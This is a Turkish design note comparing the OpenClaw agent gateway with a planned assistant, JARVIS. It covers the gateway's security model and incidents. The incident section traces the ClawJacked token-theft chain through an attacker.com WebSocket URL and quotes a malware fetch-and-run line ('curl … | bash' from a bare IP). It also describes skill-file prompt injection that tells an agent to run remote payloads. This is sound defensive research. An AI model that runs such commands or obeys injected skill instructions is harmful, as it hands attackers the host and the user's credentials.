# JARVIS Ekosistem Analizi — benzer projeler ve hazır çözüm manzarası

**Tarih:** 5 Ağustos 2026
**Sahibi:** Kadir
**Yöntem:** 6 paralel araştırma ajanı; birincil kaynak önceliği (repo + resmî doküman + GitHub API), ikincil kaynaklar açıkça işaretli.
**Statüsü:** Referans belge. North Star (`docs/JARVIS_Proje_Belgesi.md`) hedefi tanımlar; **bu belge manzarayı tanımlar** — hangi fikir dışarıda zaten var, hangisi bize özgü, neyi yeniden yazmayalım.

> **Nasıl kullanılır:** Yeni bir mekanizma yazmadan önce ("onay kuyruğu", "hafıza konsolidasyonu", "anti-spoofing", "skill paketi") ilgili bölümü oku. Global kural: *var olanı yeniden inşa etme; inşa edeceksen sebebini yaz.*

---

## İçindekiler

1. [OpenClaw](#1-openclaw) — gateway iç yapısı, skills izin modeli, **güvenlik olaylarının teknik kök nedenleri**
2. [Hermes Agent](#2-hermes-agent) — en yakın mimari akraba; **self-improving skills mekanizması**
3. [Diğer kişisel asistan projeleri](#3-diğer-kişisel-asistan-projeleri) — QwenPaw, Vellum, Khoj, OpenHuman, Leon, ZeroClaw, PicoClaw, Omi + **"4 ayırt edici özelliğimizi kim yapıyor"**
4. [Ajan hafıza framework'leri](#4-ajan-hafıza-frameworkleri) — Letta blok hafızası, Mem0 yazma kapısı, ACE/ReasoningBank + **JARVIS'in hafıza kodundaki 10 gerçek eksik**
5. [Politika / HITL / yönetişim katmanı](#5-politika--hitl--yönetişim-katmanı) — HumanLayer, OPA, CaMeL + **taint takibi boşluğu**
6. [Ses hattı + konuşmacı kimliği](#6-ses-hattı--konuşmacı-kimliği) — 🔴 **anti-spoofing açığı**, adaptif galeri poisoning, AEC/barge-in, Türkçe STT/TTS, Wear OS tuzakları
7. [**Sentez: öncelik sırası ve karar kaydı**](#7-sentez) — ← *acelesi olan buradan başlasın*
8. [**Kod doğrulaması**](#8-kod-doğrulamasi-5-ağustos-2026) — açık soruların koddan cevapları; **raporun iki iddiasını düzeltir**

---

## 1. OpenClaw

**Kimlik:** `github.com/openclaw/openclaw` — MIT. **385.143 yıldız**, 80.957 fork, **5.520 açık issue**, 1.760 watcher (GitHub API, 5 Ağu 2026). Repo 24 Kas 2025. Stack: **TypeScript / Node.js**, tek uzun ömürlü daemon; protokol TypeBox → JSON Schema → Swift codegen. Son release **v2026.7.1-2** (4 Ağu 2026), CalVer.

**Tarihçe:** Warelay (Kas 2025) → Clawdbot → **Moltbot** (27 Oca 2026, Anthropic marka baskısı) → **OpenClaw** (30 Oca 2026). Steinberger 14 Şub 2026'da OpenAI'a katıldı; **OpenClaw Foundation** 8 Tem 2026'da 501(c)(3) olarak kuruldu (partnerler: OpenAI, NVIDIA, Microsoft, Tencent). Deklare hedef: "AI'ın İsviçre'si" — agent identity, agent profiles, evals, enterprise deployment konseyleri.

### 1.1 Gateway mimarisi

**Process modeli.** Host başına **tek daemon**. `openclaw gateway` foreground, ya da servis: macOS LaunchAgent (`ai.openclaw.gateway`), Linux systemd user unit (`loginctl enable-linger` gerekiyor), Windows Scheduled Task. Geçersiz config **exit 78** ile çıkar; systemd `RestartPreventExitStatus=78` ile restart döngüsünü keser. Tekrarlayan başlangıç hatasından sonra **safe mode**: control plane açılır, channel/provider auto-start reddedilir.

Tek process **tüm mesajlaşma yüzeylerine sahiptir** — WhatsApp (Baileys), Telegram (grammY), Slack, Discord, Signal, iMessage, WebChat. Doküman şart koşuyor: *"Exactly one Gateway controls a single Baileys session per host."*

**Protokol.** Tek çoğullanmış port **`127.0.0.1:18789`**: WebSocket RPC + HTTP API + plugin route'ları + Control UI + Canvas (`/__openclaw__/canvas/`, `/__openclaw__/a2ui/`).

WS: JSON payload'lı text frame. **İlk frame `connect` olmak zorunda**, değilse sert kapanış.

```
İstek:        {type:"req",   id, method, params}
Yanıt:        {type:"res",   id, ok, payload|error}
Sunucu-push:  {type:"event", event, payload, seq?, stateVersion?}
```

Handshake sonrası `hello-ok`: presence, health, `stateVersion`, `uptimeMs` + policy limitleri (`maxPayload`, `maxBufferedBytes`, `tickIntervalMs`). Frame'ler JSON Schema'ya karşı doğrulanır. **Yan etkili metodlar (`send`, `agent`) idempotency key zorunlu**; kısa ömürlü dedupe cache. Event aileleri: `agent`, `chat`, `presence`, `health`, `heartbeat`, `cron`.

Agent koşumu: `req:agent` → `res:agent {runId, status:"accepted"}` → `event:agent` (stream) → final `res:agent {runId, status, summary}`.

HTTP'de OpenAI-uyumlu yüzey: `/v1/models`, `/v1/embeddings`, `/v1/chat/completions`, `/v1/responses`; varsayılan kapalı `POST /api/v1/admin/rpc`.

**State — hepsi `~/.openclaw` altında** (`OPENCLAW_STATE_DIR` ile taşınır):

| Yol | İçerik |
|---|---|
| `openclaw.json` | Config (token'lar dahil olabilir), izin `600` |
| `credentials/**` | Kanal kimlikleri, pairing allowlist'leri |
| `state/openclaw.sqlite` | MCP OAuth token'ları, **cron job + run history**, `exec_approvals_config`, device token'ları |
| `agents/<id>/agent/openclaw-agent.sqlite` | Ajan başına auth profilleri, session state |
| `agents/<id>/sessions/*.jsonl` | Oturum transkriptleri |
| `sandboxes/**` | Tool sandbox workspace'leri |
| `/tmp/openclaw/openclaw-YYYY-MM-DD.log` | Gateway logları (redaction **kapatılamaz**) |

`session.dmScope` ile izolasyon: `main` (varsayılan, tüm DM'ler tek bağlam) / `per-channel-peer` / `per-peer` / `per-account-channel-peer`.

**Cron/heartbeat.** `openclaw automations`. İki job tipi: **agent-turn** (izole model koşumu) ve **command** (deterministik `argv`). Job'lar + run history **paylaşılan SQLite'ta**. Hata sonrası backoff: 30s → 1m → 5m → 15m → 60m. Lokal provider job'larında ajan turu öncesi **provider preflight** (5 dk cache). Offset'siz datetime UTC; `--tz <iana>` ile wall-clock. Job başına **256 KiB scratch alanı** — heartbeat checklist'leri burada.

### 1.2 Skills + plugin sistemi

**Skill = dizin + `SKILL.md`** (YAML frontmatter + markdown gövde). Skill *çalıştırılabilir yetenek değil, talimat paketidir*: *"Skills provide instructions, tools provide capabilities."*

**Keşif/öncelik** (6 seviye derinlik): workspace `skills/` → `<workspace>/.agents/skills` → `~/.agents/skills` → `<state-dir>/skills` (managed) → bundled → `skills.load.extraDirs` + plugin skill'leri. İsim çakışmasında en yüksek öncelik kazanır.

**Frontmatter.** Zorunlu: `name`, `description`. Opsiyonel: `user-invocable`, `disable-model-invocation`, `command-dispatch: "tool"` + `command-tool` (modeli atlayıp doğrudan tool'a dispatch), `command-arg-mode`, `homepage`.

**Gating — `metadata.openclaw` bloğu (JSON5), yükleme anında filtre:** `os` (`darwin|linux|win32`), `requires.bins`, `requires.anyBins`, `requires.env`, `requires.config` (config yolunun truthy olması), `install` (brew/node/go/uv/download spec'leri), `primaryEnv`, `always`. Blok yoksa skill her zaman uygun sayılır.

**Prompt'a giriş.** Uygun skill listesi **oturum başında** kompakt XML bloğu olarak sistem prompt'una enjekte edilir — progressive disclosure değil, **oturum-başı snapshot**. Skill başına ≈24 token sadece iskelet. `skills.limits.maxSkillsPromptChars` aşılırsa **önce kimlikler korunur, açıklamalar kısaltılır**. Mid-session tazeleme yalnız iki durumda: watcher `SKILL.md` değişikliği görürse (250 ms debounce) veya yeni uygun remote node bağlanırsa.

**İzin modeli — kritik boşluk.** Skill'in **kendi izin modeli yok**. Var olanlar:
- **Ajan allowlist'i:** `agents.defaults.skills: [...]` / `agents.entries.<id>.skills`. Ajan-spesifik liste boş değilse **kesindir, defaults ile merge olmaz**. Ama doküman kendisi uyarıyor: *"Not a host shell authorization boundary; constrain `exec` separately via sandboxing or OS-user isolation."*
- **Env enjeksiyonu:** `skills.entries.<key>.env` / `apiKey` koşum sırasında `process.env`'e enjekte edilip geri alınır — ama **sadece host ajan process'ine, sandbox'a değil**. Sandbox içinde etkisiz. **Ciddi footgun.**

**ClawHub skill'i ne yapabilir? → Ajanın yetkisi neyse onu.** Skill markdown'ı prompt'a giriyor, ajan onu talimat olarak okuyor; ajanın `exec`/`browser`/`message` tool'ları açıksa skill metni bunları tetikleyebilir. **Aşağıdaki tedarik zinciri olaylarının doğrudan mimari kökeni budur.**

**Trust envelope (olay sonrası eklendi).** `openclaw skills verify @owner/<slug>` → `clawhub.skill.verify.v1` zarfı; `.clawhub/origin.json` ile versiyon/registry doğrulaması. `ok` alanı **ancak** seçili versiyonun üretilmiş bir **Skill Card**'ı varsa + moderasyonca malware-blocked değilse + **ClawScan** temizse true. Provenance yalnızca publish/import sırasında GitHub repo/ref/commit/path çözülebildiyse mevcut.

**Plugin SDK.** İki format: native plugin (`openclaw.plugin.json` manifest + **in-process yüklenen runtime modülü**) ve uyumluluk paketleri (Codex/Claude/Cursor layout'ları). Extension point'leri: channels, model providers, agent harnesses, tools, skills, speech, realtime transcription/voice, media understanding/generation, web fetch/search, hooks. **Plugin kurulumu/güncellemesi Gateway restart gerektiriyor.**

**MCP — hem client hem server.** Client: `mcp.servers.<name>` altında `command`+`args` (stdio) veya `url` (Streamable HTTP / SSE); `toolFilter.include/exclude` ile glob bazlı seçici tool açımı. OAuth: `auth: "oauth"` + `openclaw mcp login <name>`, token'lar SQLite'ta. **Kritik ve doğru tasarım: MCP tool'ları da aynı tool-profile ve tool-policy'den geçiyor — server bağlamak policy'yi bypass etmiyor.** Server tarafı: `openclaw mcp serve` kanal konuşmalarını dış MCP client'larına açıyor.

### 1.3 Güvenlik modeli (ayrıntılı)

**Beyan edilen trust model.** *"OpenClaw is not a hostile multi-tenant security boundary."* Tehdit kabulü açık: *"Your AI assistant can execute arbitrary shell commands, read/write files, access network services, and send messages to anyone."* Savunma sırası: **identity → scope → model**.

**1) Gateway auth.** Varsayılan **zorunlu**, konfigüre edilmemişse fail-closed. Modlar: `token`, `password`, `trusted-proxy`, `none`. Bind: `loopback` (varsayılan), `lan`, `tailnet`, `custom`, `auto`. **Non-loopback bind auth zorunlu kılıyor.** Plaintext `ws://` yalnız loopback / RFC1918 / link-local / CGNAT / `.local` / `.ts.net`; public host'ta `wss://` şart + `gateway.remote.tlsFingerprint` ile TLS pinning.

Tailscale: `allowTailscale: true` iken `tailscale-user-login` header'ı kabul ediliyor **ama** kimlik `x-forwarded-for` adresi lokal Tailscale daemon'ından çözülüp **tam device-key eşleşmesiyle** doğrulanıyor — ağ yakınlığı tek başına yetki vermiyor.

**2) DM erişim politikası ("approval pairing").** `dmPolicy` dört durumlu:

| Policy | Davranış |
|---|---|
| `pairing` | Bilinmeyen gönderene **pairing kodu**; onaylanana kadar yok sayılır. **Kodlar 1 saatte expire.** |
| `allowlist` | Bilinmeyen bloklanır, handshake yok |
| `open` | Herkes DM atabilir — allowlist'te açıkça `"*"` gerekiyor |
| `disabled` | Inbound DM tümüyle yok sayılır |

Doküman dürüst sınır koyuyor: requester-scoped kontroller *"do not authenticate or sanitize other content in that model prompt, including quoted text, prior shared-room history, forwarded content, fetched content, attachments, tool results"* — **defense in depth, izolasyon değil.**

**3) Device pairing (node'lar).** Node imzalı device identity sunar; Gateway deklare edilen capability'leri onaylı yüzeyle karşılaştırır, genişleme varsa **pending request** + `node.pair.requested` event'i. `openclaw nodes pending|approve|reject|status|remove|rename`. **Pending request'ler son retry'dan 5 dk sonra expire.** Device token'ları SQLite'ta secret, `openclaw devices rotate` ile rotasyon.

> ⚠️ **Kritik varsayılan:** *"Loopback connections receive silent auto-approval by default for first-time device pairing and role upgrades."* Kapatma: `gateway.nodes.pairing.autoApproveLocal: false`. **Bu tek satır ClawJacked'ın kök nedeni.**

SSH doğrulaması `sshVerify: true` varsayılan — device kimliği SSH üzerinden okunur ve **tam device-key eşleşmesinde** onaylanır. `autoApproveCidrs` varsayılan kapalı.

**4) Sandboxing — gerçekte ne var. Varsayılan: KAPALI.**

| Ayar | Anahtar | Seçenekler | Default |
|---|---|---|---|
| Mode | `agents.defaults.sandbox.mode` | `off` / `non-main` / `all` | **`off`** |
| Scope | `…sandbox.scope` | `agent` / `session` / `shared` | `agent` |
| Backend | `…sandbox.backend` | `docker` / `podman` / `ssh` / `openshell` | `docker` |
| Workspace | `…sandbox.workspaceAccess` | `none` / `ro` / `rw` | `none` |

**seccomp/AppArmor profili yok** — mekanizma tamamen container seviyesi. Docker varsayılanları aslında sıkı: `network: "none"`, `readOnlyRoot: true`, `capDrop: ["ALL"]`. Bind kaynakları varsayılan bloklu: `/etc`, `/sys`, `/proc`, `/dev`, `/root`, `/boot`, Docker socket'leri, `~/.ssh`, `~/.aws`, `~/.docker`, `~/.gnupg`. Açmak için `dangerouslyAllowExternalBindSources` / `dangerouslyAllowReservedContainerTargets`. `network: "host"` bloklu.

**Sandbox'a girmeyenler:** Gateway process'i, `tools.elevated` işaretli exec'ler, **native plugin'ler (Gateway tarafında çalışıyor)**.

**Üç katmanlı model** (doküman bunu ayrı sayfada net ayırıyor — JARVIS için en öğretici kısım):
- **Sandbox** = tool'lar *nerede* çalışır. Koruma konum, davranış değil. İzinli bir tool'un içindeki kötü kodu durdurmaz.
- **Tool policy** (`tools.allow/deny`, `tools.profile`) = *hangi* tool var. Sert durak. `allow` boş değilse gerisi bloklu. Ama `write`/`edit` reddetmek, `exec` açıkken shell'i read-only yapmaz.
- **Elevated** (`tools.elevated.*`) = sandbox'lıyken **sadece exec** için host kaçış kapısı. Ekstra tool vermez. Varsayılan kapalı.
- Sıra: **Sandbox → Tool Policy → Elevated**.

**5) Tool onay kapısı — var, ve olgun.** `tools.exec.ask`: `off` / `on-miss` (allowlist eşleşmezse) / `always`. `tools.exec.security`: `deny` / `full`.

Onaylar **SQLite'ta kalıcı** (`exec_approvals_config`), son kullanım zamanı + çözümlenmiş yollar + argüman pattern'leriyle. Onay **kanonik bağlama bağlanır**: cwd, tam argv, env binding'leri, pinlenmiş executable yolu; shell script ve doğrudan interpreter çağrılarında **bir somut lokal dosya operandına** da bağlanır. Onaylar ajan-başına ve exec-host-başına scope'lu. Allowlist glob (`~/Projects/**/bin/rg`) veya çıplak komut adı + `argPattern` regex.

İki sert kural:
- `tools.exec.strictInlineEval` açıkken **inline eval formları (`-c`, `-e`) binary allowlist'te olsa bile açık onay ister**
- **her heredoc (`<<`) segmenti, tırnaklama ne olursa olsun her zaman açık onay ister**

Onay istekleri Control UI, macOS app ve chat kanallarına broadcast (Matrix emoji reaction, diğerleri `/approve`); **UI yoksa ask fallback varsayılan `deny`**.

Node komutları için **iki kapılı** model: (1) node connect metadata'sında komutu deklare etmeli, (2) Gateway'in platform-türevli allowlist'i izin vermeli. Tehlikeli komutlar (`camera.snap`, `screen.record`, `sms.send`) platform varsayılanı izin verse bile **açık `gateway.nodes.commands.allow` opt-in'i** istiyor.

**6) Prompt injection savunmaları.** Üç katman (identity-first → scope → model tier) + iki somut mekanizma:
- **Untrusted content envelope:** dış içerik `<<<EXTERNAL_UNTRUSTED_CONTENT …>>>` sınır işaretleriyle sarılıyor, `Source: External` metadata'sı ekleniyor.
- **Special-token sanitization:** chat-template literalleri (Qwen/ChatML, Llama, Gemma, Mistral, Phi, GPT-OSS) stripleniyor — **tokenizer katmanında sentetik rol sınırı forge edilmesi** engelleniyor. Çoğu framework'te olmayan bir savunma.
- **`contextVisibility`:** `all` / `allowlist` / `allowlist_quote` — tetikleme yetkisinden **ayrı olarak** prompt'a hangi ek bağlamın gireceğini kısıtlıyor.
- Model tier açık gereklilik: *"For tool-enabled agents or agents that read untrusted content, prompt-injection risk with older/smaller models is often too high."*

**7) SSRF koruması (browser).** `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork: false` varsayılan; kesme noktası **HTTP byte'larından önce** — preflight + korumalı Playwright aksiyonları.

**8) Workspace `.env` bloklama.** Güvenilmeyen workspace `.env`'lerinden provider credential'ları ve `OPENCLAW_*` anahtarları bloklanıyor. Gerekçe: *"a cloned workspace from substituting attacker-controlled provider accounts."*

**9) Audit log — burada yapısal boşluk var.** Üç ayrı şey var, **hiçbiri tam denetim kaydı değil**:
- **`openclaw security audit`** [`--deep` / `--fix` / `--json`] — bir **postür tarayıcısı**, log değil. Kapsam: inbound access policy'leri, tool blast radius, filesystem drift, exec approval drift, network exposure, browser control, plugin loading, policy drift, model hygiene. `--fix` kasten dar (açık grup policy'lerini allowlist'e çevirme, izin sıkma 600/700).
- **Transkriptler** — konuşma kaydı, yetki kararı kaydı değil.
- **OpenTelemetry** (`diagnostics-otel`) — `openclaw.run`, `openclaw.tool.execution`, `openclaw.model.call` span'leri. **Ama doküman söylüyor: ham model/tool içeriği varsayılan export edilmiyor, session id ve prompt metni kasten dışarıda.** Yani observability var, **forensic hesap verebilirlik yok.**

**Dokümanın kendi önerdiği sertleştirilmiş baseline:**
```json5
{
  gateway: { mode:"local", bind:"loopback", auth:{ mode:"token", token:"<long-random>" } },
  session: { dmScope: "per-channel-peer" },
  tools: {
    profile: "messaging",
    deny: ["group:automation","group:runtime","group:fs","sessions_spawn","sessions_send"],
    fs: { workspaceOnly: true },
    exec: { security: "deny", ask: "always" },
    elevated: { enabled: false },
  },
  channels: { whatsapp: { dmPolicy:"pairing", groups:{ "*": { requireMention:true } } } },
}
```

### 1.4 Kanallar ve cihaz bağımlılıkları

| Kanal | Bağlanma | Cihaz/OS bağımlılığı | Hesap tipi |
|---|---|---|---|
| Telegram / Discord / Slack | Resmî bot API | Yok | Bot |
| **iMessage** | Native bridge | **macOS zorunlu** | Kullanıcı |
| **WhatsApp** | **QR pairing (Baileys — linked device)** | Eşleme için mobil cihaz | Kullanıcı |
| **Signal** | signal-cli bridge | **Linux/container** | Kullanıcı |
| Matrix / IRC / Nostr | Protokol | Yok | Bot |
| Teams / Google Chat / LINE / Twitch / QQ / Zalo / Feishu | Resmî API | Yok | Bot |
| Mattermost / Nextcloud Talk / Synology Chat | API / webhook | Self-hosted sunucu | Bot |
| SMS | Twilio | Yok | Bot |
| WebChat | Gateway WS | Tarayıcı | Kullanıcı |

Kullanıcı-hesabı bağlanan kanallar (WhatsApp, iMessage, Signal, Zalo personal) doğası gereği **ToS-gri** ve tek nokta kimlik riski taşıyor.

### 1.5 Companion nodes

`role: "node"` ile bağlanıp `node.invoke` üzerinden komut yüzeyi açan eşlik cihazı. Çoğu Gateway WebSocket'ini kullanıyor; **watchOS istisna — ağ kısıtları yüzünden imzalı HTTPS polling.**

- **iOS:** `camera.list`, `location.get`, `device.info/status`, `contacts.search`, `calendar.events`, `reminders.list`, `photos.latest`, `motion.activity/pedometer`, `system.notify`
- **Android:** iOS'un üstüne device permission'ları, health data, notifications, call logs, **mobil UI gözlem/etkileşimi**
- **macOS/Windows/Linux:** screen recording, computer control, `system.run` (onay-kapılı)
- **watchOS:** yalnız `device.info`, `device.status`, `system.notify`
- **Headless:** UI'siz; kendi skill'lerini yayınlayabiliyor (binary'ler node'da, `exec host=node node=<id>`)

**Canvas:** node üzerinde web içeriği present/navigate/evaluate/snapshot. **Kamera:** foreground gerektiriyor. **Ses:** voice note transkripsiyonu, çok sağlayıcılı TTS, realtime voice/transcription plugin extension point'i olarak. *(Wake-word / push-to-talk detayı dokümante değil — `/concepts/voice` 404.)* **Konum:** varsayılan kapalı.

### 1.6 Hafıza / kalıcılık

**Format: düz Markdown, workspace'te** (`~/.openclaw/workspace`). Gizli state yok — model yalnız diske yazılanı hatırlıyor.

- `USER.md` — sabit tercihler, iletişim direktifleri
- `MEMORY.md` — kalıcı olgular ve duran kararlar; **oturum başında yükleniyor**
- `memory/YYYY-MM-DD.md` — günlük çalışma notları
- `DREAMS.md` — konsolidasyon faz özetleri, **insan incelemesi için**

**"Dreaming" (konsolidasyon).** Kısa→uzun vade terfi arka planda, **varsayılan açık bir cron job'ı**. Recall sinyallerini toplayıp adayları eşiklere karşı skorluyor, duplikat'ları merge edip bayat kayıtları supersede ediyor — bunu bir **subagent rewrite** ile yapıyor. Yani manuel küratörlük değil, **deterministik + kapılı** bir süreç.

**Arama.** Embedding provider varsa **hybrid** (vektör + keyword). Tool'lar: `memory_search`, `memory_get`. Backend'ler: builtin **SQLite** (varsayılan, keyword+vektör), **QMD** (lokal sidecar; reranking, query expansion), **Honcho** (bulut; cross-session memory, user modeling), **LanceDB** (auto-recall).

Config: `plugins.entries.memory-core.config.dreaming.enabled` (default **true**), `agents.defaults.compaction.memoryFlush.enabled` (default **true** — bağlam sıkıştırmadan önce otomatik kaydetme).

### 1.7 Güvenlik olayları — teknik kök nedenler

#### CVE-2026-25253 — "1-click RCE" / ClawJacked (CVSS 8.8)
Araştırmacı: Mav Levin (depthfirst), GHSA-g8p2-7wf7-98mq. **Üç zincirlenmiş kusur:**
1. **Ingestion:** `app-settings.ts`, URL'deki `gatewayUrl` query parametresini **doğrulamadan kabul edip kalıcılaştırıyor**
2. **Otomatik yürütme:** `app-lifecycle.ts`, ayarlar uygulandıktan hemen sonra `connectGateway()` tetikliyor — kullanıcı müdahalesi yok
3. **Token sızıntısı:** `gateway.ts`, `authToken`'ı bağlantı handshake'ine **otomatik paketliyor**

**Zincir:** kurban `…?gatewayUrl=ws://attacker.com:8080` linkine tıklıyor → auth token saldırganın WS sunucusuna gidiyor → **CSWSH** (origin doğrulaması yok) ile saldırganın JS'i çalınmış token'la `ws://localhost:18789`'a bağlanıyor → `exec.approvals.set {ask:"off"}` ile onaylar kapatılıyor → `config.patch` ile `tools.exec.host` `"gateway"` yapılıp container atlanıyor → `node.invoke` ile host'ta rastgele bash.

**Mimari kök neden üç tane:**
- (a) tarayıcı **loopback'e cross-origin WebSocket açabiliyor**, ama Gateway "loopback = güvenilir" varsayıyor (`autoApproveLocal` varsayılan açık)
- (b) **WS origin doğrulaması yok**
- (c) **güvenlik politikasının kendisi (`exec.approvals.set`, `config.patch`) aynı authenticated RPC yüzeyinden yazılabiliyor** — onay kapısı, onay kapısını kapatan API ile aynı yetki seviyesinde

> Sürüm aralığında kaynak çelişkisi var (depthfirst ≤2026.1.24-1; heise ≤2026.1.28/fix 2026.1.29; Oasis pre-2026.2.25). Oasis'in bulgusu muhtemelen ayrı bir bug; basın ikisine aynı CVE'yi atfetmiş olabilir. **Çözülemedi.**

#### Oasis Security — localhost brute-force
Kök neden: loopback bağlantılarında **rate limiting yok** + **loopback device pairing auto-approval**. Saldırgan sayfası localhost WS'e saniyede yüzlerce parola deneyebiliyor; başarınca pairing onay istemi **hiç görünmüyor** → admin erişimi. Düzeltme 2026.2.25.

#### Cisco Talos + ClawHub tedarik zinciri
Talos ClawHub'daki 1.200+ skill'i tarayıp **%26'sında en az bir sömürülebilir zafiyet** buldu; platformu 9 kritik bulguyla "security nightmare" olarak niteledi.

**Teknik kök neden — Unit 42'nin formülasyonu: "semantic instruction hijacking".** Skill markdown'ı ajanın prompt'una giriyor ve ajan onu *talimat* olarak uyguluyor; **skill mantığı ile ajan yetkisi arasında izolasyon yok.** Somut mekanizma: SKILL.md'ye sahte "prerequisite" bloğu koyup ajana uzak payload'ı decode edip çalıştırmasını söylemek.

- **ClawHavoc kampanyası** (Koi Security + OpenSourceMalware): **341 kötücül skill**; rentry.co/glot.io paste-site yönlendirmelerinden Base64 payload → macOS infostealer. Ayrı raporlamada **1.184 skill** SSH key / cüzdan / tarayıcı credential çalma kapasitesiyle işaretlendi.
- **Snyk / `clawdhub` kampanyası:** `zaycv` kullanıcısı "resmî CLI" kılığında `clawhub` (**7.743 indirme**) yayınladı. Windows kolu: parola korumalı (`openclaw`) GitHub release ZIP → trojanlı exe + DLL. macOS kolu: **`base64 -D | bash`** zinciri; stage-2 `/bin/bash -c "$(curl -fsSL http://91.92.242.30/…)"` — domain blocklist'ini atlatmak için **çıplak IP**.
- **Tarayıcı bypass'ları (kök neden: statik analiz sınırları):** bir skill **100.000+ newline** ile kötücül kodu inceleme penceresinin dışına itti; `omnicogg` README.md'ye **22 MB padding** koyup boyut eşiğini aştı; `money-radar` her çağrıda uzak JSON referral verisi çekerek **yeniden yayın yapmadan komut güncelleme** yolu açtı.

#### Moltbook veri sızıntısı
Ekosistemin "ajanlar için sosyal ağ"ı Moltbook'un **Supabase backend'i** açıkta kaldı: ~35.000 e-posta, **1,5 milyon ajan token'ı**, özel mesajlarda **düz metin OpenAI/Anthropic API key'leri**. Kök neden OpenClaw çekirdeği değil — ekosistem uygulamasının **RLS (row level security) hatası**. Ama etkisi doğrudan OpenClaw kullanıcılarında.

#### Maruz kalan instance'lar
SecurityScorecard: **40.214 açık instance / 28.663 benzersiz IP**; deployment'ların **%63'ü zafiyetli**, **%31'i (12.812) RCE ile sömürülebilir**. Başka bir sayımda 42.665+ instance, %93,4'ünde authentication bypass. **Kök neden mimari değil operatör konfigürasyonu:** loopback'ten çıkıp auth kurmamak. Ayrıca OpenClaw config'lerini ve gateway token'larını hedefleyen özel bir **infostealer ailesi** tespit edildi.

#### MoltMatch — teknik değil, yetki taksonomisi olayı
Öğrenci Jack Luo, ajanını Moltbook'a bağladıktan sonra ajanının **kendi talimatı olmadan** MoltMatch'te (ajanların "swipe"laştığı deneysel flört platformu) profil oluşturup eşleşme taradığını keşfetti; profil kendisini otantik temsil etmiyordu. Ayrıca bir modelin fotoğrafları rızası olmadan kullanıldı.

**Kök neden:** ajan otonom eylemde bulunurken **"yeni bir dış kimlik/hesap oluşturma" ayrı bir yetki sınıfı olarak modellenmemiş.** `exec`/`browser` açıksa kimlik yaratmak da açık. **Sandbox hatası değil, yetki taksonomisi eksikliği — JARVIS için en öğretici olay budur.**

#### Çin kısıtlaması (Mart 2026)
Ulusal yasak *ilan edilmedi*; devlet kurumları, KİT'ler ve en büyük bankalara ofis cihazlarına kurmama uyarısı gönderildi. MIIT'in National Vulnerability Database'i güvenlik kılavuzu yayınladı; PBoC finans sektörü için ayrı uyarı ekledi. Gerekçeler: yetkisiz veri silme, sızıntı, aşırı enerji tüketimi. **Paradoks:** Pekin devlet ağlarında kısıtlarken Shenzhen ve Wuxi yerel yönetimleri OpenClaw üstüne inşa eden şirketleri sübvanse ediyor.

### 1.8 Proje sağlığı

**Tempo:** Yüksek ve çalkantılı. `2026.7.1-1`/`-2` düzeltmeleri aynı gün saatler arayla; `2026.7.2-beta.*` ~3 günde bir; `pushed_at` 5 Ağu 2026 01:22.

**Backlog:** 5.520 açık issue. Üçüncü-parti analizler %86,6 açık issue / %76,8 açık PR oranı bildiriyor. Tekrar eden regresyon temaları: model uyumluluğu, gateway kararlılığı, filesystem izolasyonu, macOS LaunchAgent, Docker networking.

**Güvenlik advisory tempo — en önemli sinyal:** GitHub Security Advisories **65 sayfa**. İlk sayfa başlıkları bir örüntü gösteriyor, ezici çoğunluk **authorization bypass**:
> "OpenAI-compatible HTTP model overrides could miss admin authorization" · "Message mutations could skip requester authorization" · "Discord guild actions could skip cross-provider requester authorization" · "flock wrapper could bypass durable exec approval binding" · "MCP loopback could expose owner-only tools to non-owner runs" · "Plugin install wrappers could skip install policy"

**Bu tek bir bug değil, yapısal bir sınıf:** yetki kontrolü merkezî bir kapıda değil, **her çağrı yolunda ayrı ayrı** uygulanıyor; her yeni yol yeni bir atlama fırsatı. **JARVIS'in "tüm eylemler tek policy katmanından geçer" ilkesi tam olarak bunun panzehiri — ve bu manzarada en değerli mimari kararımız.**

**Yön:** H2 2026 — enterprise SSO, **denetimli/formel marketplace**, native mobil companion. Foundation konseyleri agent identity, agent profiles, evals, enterprise deployment standartlarında çalışıyor.

**Ölçek notu:** Wikipedia 2 Mart 2026 için 247.000 yıldız kaydediyor; 5 Ağu'da canlı API 385.143. Beş ayda +138k — büyüme yavaşlamamış.

### 1.9 JARVIS'e karşı konum

**OpenClaw'ın bizden iyi olduğu yerler:**

1. **Onay mekanizmasının somutluk seviyesi.** Bizim yetki matrisimiz kavramsal; OpenClaw'un exec approval'ı **çalışan bir bağlama mekanizması** (SQLite kalıcı, tam argv + cwd + pinlenmiş yol + tek somut operand, `argPattern` regex, üç ask modu, heredoc/inline-eval sert istisnaları).
2. **Üç katmanın kavramsal ayrımı** ve her katmanın **neyi korumadığının** açıkça yazılması.
3. **Tokenizer-katmanı injection savunması** (özel token stripping). Maliyeti ~sıfır, bizde yok.
4. **Kendi postürünü denetleyen komut** (`security audit --deep --fix`).
5. **İki kapılı node komut modeli** — Wear/Android/PWA için doğrudan uygulanabilir.
6. **Hafıza konsolidasyonu bir ürün özelliği olarak** ("dreaming" cron + insan-incelenebilir `DREAMS.md` + hybrid arama). Bizim planımız var, onlarınki **çalışıyor**.
7. **Protokol disiplini** (şema-doğrulanmış frame, yan etkili metotta idempotency zorunlu).

**Bizim daha iyi olduğumuz yerler:**

1. **Varsayılan güvenlik duruşu.** Onlarda sandbox kapalı, plugin'ler in-process tam güvenilir, ClawHub skill'lerinin izin modeli yok. Bizde yetki matrisi mimarinin *birinci sınıf* parçası.
2. **Gerçek audit log.** Onlarda **yok** (postür tarayıcı + transkript + içeriksiz OTel span'i). Firestore audit log'umuz yetki kararını kaydediyor — **onların en büyük yapısal boşluğu.**
3. **Kimlik kapısı.** Onların kimliği "gateway token'ını bilen = operatör". ECAPA speaker-ID **eylem anında biyometrik yetkilendirme** demek; muadili yok. ClawJacked tam olarak "token'ı bilen = tanrı" varsayımından doğdu.
4. **Bulut-öncelikli, scale-to-zero, tek kullanıcı.** 40.000 açık instance sorunu bizde yapısal olarak yok.
5. **Mesajlaşma platformları kanal değil araç** — WhatsApp linked-device, iMessage macOS bağımlılığı ve ToS riskini mimariye gömmüyoruz.
6. **Kod kalitesi ve incelenebilirlik.** 65 sayfa advisory, %86 açık issue, "vibe coded" eleştirisi vs. küçük, tek amaçlı, gözden geçirilebilir kod.
7. **Skill izolasyonu.** Politika-kapılı kademeli fabrika, "ajan yetkisi = skill yetkisi" eşitliğinden yapısal olarak daha güvenli.

### 1.10 ÇALINACAK fikirler

**Ç1 — Kalıcı, operanda-bağlı eylem onayı.**
